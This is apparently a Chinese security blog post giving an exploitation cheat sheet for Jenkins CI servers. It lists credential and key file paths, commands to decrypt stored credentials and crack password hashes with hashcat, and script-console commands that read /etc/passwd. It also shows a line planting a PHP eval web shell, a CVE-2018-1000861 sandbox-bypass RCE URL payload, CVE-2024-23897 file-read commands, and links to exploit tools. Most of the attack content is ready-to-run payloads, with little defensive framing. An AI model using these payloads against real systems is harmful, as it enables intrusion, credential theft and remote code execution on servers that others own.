#  Jenkins漏洞利用精华总结   
原创 simeon的文章  小兵搞安全   2024-12-26 14:33  
  
### 1.1.1简介  
  
1.Jenkins简介  
  
Jenkins是一个开源软件项目，最开始被称作 Hudson，基于Java开发的一种使用非常广泛的持续集成工具，用于监控持续重复的工作。由于易于使用并且具有良好的扩展性，Jenkins深受用户喜爱，在持续集成领域的市场份额居于主导地位，其被各种规模的团队用于各种语言和技术的项目中，比如：.NET、Java、Ruby、Groovy、Grails、PHP 等。目前最新版本Jenkins 2.462.2 LTS，官方地址：  
https://www.jenkins.io/  
  
2.Jenkins重要配置文件  
  
如果拿到Jenkins的根目录，还可以来尝试读取这些敏感文件：  
  
/var/jenkins_home/users/*/config.xml  
  
/var/jenkins_home/secret.key  
  
/var/jenkins_home/secrets/master.key  
  
/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac  
  
3.jenkins用户及密码配置文件  
  
在 Jenkins 中，用户信息和密码通常存储在 Jenkins 的配置文件和数据库中，而不是明文保存在某个单一文件中。具体来说，Jenkins 使用 XML 文件和 H2 数据库来存储用户信息和相关配置。  
  
（1）用户信息文件  
  
Jenkins 为每个用户创建一个单独的目录，这些目录位于 users 文件夹中。每个用户的目录中包含了一些配置文件，例如：  
  
Linux 和 macOS：/var/lib/jenkins/users  
  
Windows：C:\Program Files (x86)\Jenkins\users  
  
（2）配置文件  
  
config.xml：包含用户的配置信息，如全名、电子邮件地址等。  
  
apiTokenStats.xml  
：包含用户的凭证信息，如 API token 等。  
  
（3）全局安全配置文件config.xml  
  
Jenkins 的全局安全配置文件 config.xml 包含了安全相关的设置，如认证和授权策略，用户分组等信息。  
  
Linux 和 macOS：/var/lib/jenkins/config.xml  
  
Windows：C:\Program Files (x86)\Jenkins\config.xml  
  
4. 用户凭证存储  
  
credentials.xml  
  
Jenkins 使用 credentials.xml 文件来存储用户的凭证信息，如 API token、SSH 密钥等。  
  
Linux 和 macOS：/var/lib/jenkins/credentials.xml  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8qYU5LWbg3uicgddXnicB87DqeOwfsrZNceQrzKBLGhbCt51xiaPjbPjeQ/640?wx_fmt=png&from=appmsg "")  
  
  
5.漏洞利用工具  
  
https://github.com/TheBeastofwar/JenkinsExploit-GUI  
  
https://github.com/TheBeastofwar/JenkinsExploit-GUI/releases  
  
https://github.com/hoto/jenkins-credentials-decryptor  
### 1.2.2凭证解密  
  
jenkins-credentials-decryptor 是一个用于解密和转储Jenkins凭证的命令行工具。Jenkins将加密的凭证存储在 credentials.xml 文件或 config.xml 文件中。要解密这些凭证，您需要 master.key 和 hudson.util.Secret 文件。所有这些文件都位于Jenkins主目录中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8tFsXBqYDPwfC0revDXJEKtoWKiaIF85yiaoxOVptBMVic2Np5tm7KBzfQ/640?wx_fmt=png&from=appmsg "")  
  
  
chmod +x jenkins-credentials-decryptor  
  
./jenkins-credentials-decryptor   -m master.key   -s hudson.util.Secret   -c credentials.xml   -o json  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8UeYBzudkcK60l10tVZjA0Mzkp16mlee8I0PaG5opibOkQDhYcAC9cug/640?wx_fmt=png&from=appmsg "")  
  
  
通过访问凭据->系统->全局凭据->某个凭据->更新来查看加密后的凭据  
  
点击系统管理->命令脚本行，输入如下代码，即可查看密码  
  
println(hudson.util.Secret.fromString('xxxxxxxxxxxxxxxxxxxx').getPlainText())  
  
println(hudson.util.Secret.decrypt("xxxxxxxxxxxxxxx"))  
### 1.1.3 jenkins用户账号密码解密  
  
在var/lib/jenkins/users/用户名开头的文件夹中获取某个config.xml的passwordHash值，将其整理成jks.txt，然后在hashcat中执行命令进行破解，如图1所示。  
  
hashcat -m 3200 -a 0 -w 3 -O jks.txt pass.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8SMub45xibInTiahHX64y3bfd6TGcDPsm8tdxzFosF0doB9Ih1hsCAZqQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8O7H2wE7wa6yAAQJl2cJ4M1C51n7LUyMdtu0nLvP6FH2xeZDBPYB5Jw/640?wx_fmt=png&from=appmsg "")  
  
### 1.1.4远程命令执行漏洞  
  
1.初始账号密码存在文件  
  
Linux: /var/lib/jenkins/secrets/initialAdminPassword  
  
Windows: C:\Users\RabbitMask\.jenkins\secrets\initialAdminPassword  
  
masterkey：  
  
d86e7f436661e2bf7eb52f51ad52d6ed392ae22dfebd649164bb83f2b409710e595c285c3ea347c0162f389f7982e62111ae6c7c33602bb5ecb2d9448fbc4f46e576a39dc5dc28871abfd3afb499be5a924bdc2893f0e06b147e5a601bc686b804564fe24a4f8e0c4af14a5a3c0df97d23da8a35fa0d2fdbe75cd19389ca5392  
  
2.登录后台访问script  
  
登录后台，或在未授权的情况下访问  
  
http://xxx.xxx.xxx.xxx/script  
  
3.在脚本命命令模块执行系统命令  
  
println 'cat /etc/passwd'.execute().text  
  
println "whoami".execute().text  
  
println "ifconfig".execute().text  
  
new File("D:\\phpstudy_pro\\WWW\\php_shell.php").write('<?php @eval($_POST[cmd]);?>');  
### 1.1.5checkScript 远程命令执行漏洞 CVE-2018-1000861  
  
漏洞描述  
  
Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。  
  
通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。  
  
#漏洞影响  
  
Jenkins version < 2.138  
  
Jenkins build time < 2019-01-28  
  
#网络测绘  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8L5Kogt0ibjNicDo1M8H394kDxoMjGfT9JqPFjUEyRr6ibQh5bQ2oibjX1w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8RFiaaPEO9Yzn5dckQib0Jrf1jQr6DAMhpkckY1fR0IlNfib3icpOFnB67Q/640?wx_fmt=png&from=appmsg "")  
  
http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript  
  
?sandbox=true  
  
&value=public class x {  
  
  public x(){  
  
    "touch /tmp/success".execute()  
  
  }  
  
poc利用代码：  
  
https://github.com/orangetw/awesome-jenkins-rce-2019  
### 1.1.6 CVE-2024-23897  
  
1.漏洞简介  
  
它允许未经认证的攻击者拥有“overall/read”权限，从而读取Jenkins服务器上任意文件中的数据。即使没有这个权限的攻击者也能读取文件的前几行，具体行数取决于可用的CLI命令。这个漏洞源自Jenkins中args4j命令解析器的默认行为，当参数以"@"字符开始时，它会自动将文件内容扩展为命令参数，这允许未经授权的任意文件读取行为在Jenkins控制器文件系统上发生。利用这个漏洞可用来读取包含加密密钥的二进制文件，虽然漏洞利用需要特定的条件，但是提取秘密为各种攻击提供了便利，例如：  
  
通过资源根 URL 远程执行代码；  
  
通过“记住我”cookie 远程执行代码；  
  
通过构建日志使用XSS攻击（跨站脚本，XSS） 远程执行代码；  
  
通过绕过CSRF（跨站请求伪造）保护来远程执行代码；  
  
解密 Jenkins 中存储的秘密；  
  
删除Jenkins中的任何元素；  
  
下载Java堆转储等等。  
  
2.漏洞利用poc  
  
（1）下载jenkins-cli.jar  
  
访问本地架设的jenkis，例如http://192.168.1.1:8080/jnlpJars/jenkins-cli.jar  
  
（2）读取敏感文件  
  
java -jar jenkins-cli.jar -s   
http://jenkins:8080/  
 connect-node "@/etc/passwd"  
  
java -jar jenkins-cli.jar -s   
http://localhost:8080/  
 -http help 1 "@/var/jenkins_home/secret.key"  
  
敏感文件地址：  
  
/var/jenkins_home/users/*/config.xml  
  
/var/jenkins_home/secret.key  
  
/var/jenkins_home/secrets/master.key  
### 1.1.7 任意文件读取漏洞（CVE-2024-43044）  
  
1.漏洞简介  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VGuVH0Ahzqn7w3ult3alMG8kZFvbmTgUfNafibAG7xEib55B0ib3tNZFQaa46j8Ih0wuTucxcNhRhicPQ/640?wx_fmt=png&from=appmsg "")  
  
CVE-2024-43044被归类为任意文件读取漏洞，允许代理从Jenkins控制器读取文件。该漏洞的根本原因在于Jenkins允许控制器向其代理传输JAR文件的功能。由于ClassLoaderProxy#fetchJar方法未能限制代理请求的文件路径，导致控制器文件系统的未经授权访问成为可能。研究人员详细分析了该漏洞的利用过程，攻击者首先利用hudson.remoting.RemoteClassLoader，从远程对等体加载类文件。通过此方法，攻击者访问与hudson.remoting.RemoteInvocationHandler相关联的Proxy对象，进而调用fetchJar方法，触发对控制器的远程过程调用（RPC）。在控制器端，fetchJar方法在未验证用户控制的URL的情况下读取资源，这一关键疏漏使攻击者能够绕过Agent -> Controller访问控制系统。利用该漏洞，攻击者可以读取控制器中的关键文件，伪造用户的“记住我”cookie，最终获得对Jenkins脚本引擎的访问权限，并执行系统命令。此漏洞已在Jenkins 2.471版本及长期支持（LTS）版本中得到修复，建议使用Jenkins的组织立即更新以降低风险。  
  
2.可利用poc  
  
（1）  
https://github.com/convisolabs/CVE-2024-43044-jenkins  
  
    java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>  
  
    java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>  
  
    java -jar exploit.jar mode_attach <cmd>  
  
（2）  
https://github.com/HwMex0/CVE-2024-43044?tab=readme-ov-file  
  
该脚本执行以下步骤：  
  
获取Jenkins版本：它向Jenkins URL发送请求，并从响应头中检索Jenkins版本。  
  
检查版本范围：它将检索到的版本与预定义的易受攻击版本范围进行比较。  
  
输出结果：根据版本检查打印出Jenkins实例是否可能存在漏洞。  
  
要检查作为命令行参数提供的Jenkins实例URL列表  
  
python CVE-2024-43044.py <url1> <url2> ...  
  
要从文件中检查Jenkins实例URL  
  
python CVE-2024-43044.py -f <file_with_urls>  
  
  
https://github.com/No-Github/CVE-2024-43044-jenkins  
  
https://github.com/jenkinsci-cert/SECURITY-3430  
  
https://github.com/v9d0g/CVE-2024-43044-POC  
  
参考文章：  
  
[https://mp.weixin.qq.com/s/ZkeCs36P-LJB60AobWQVpA](https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247513087&idx=1&sn=b43a8e2691f18bdf2f963b5b346b7f85&scene=21#wechat_redirect)  
  
  
  
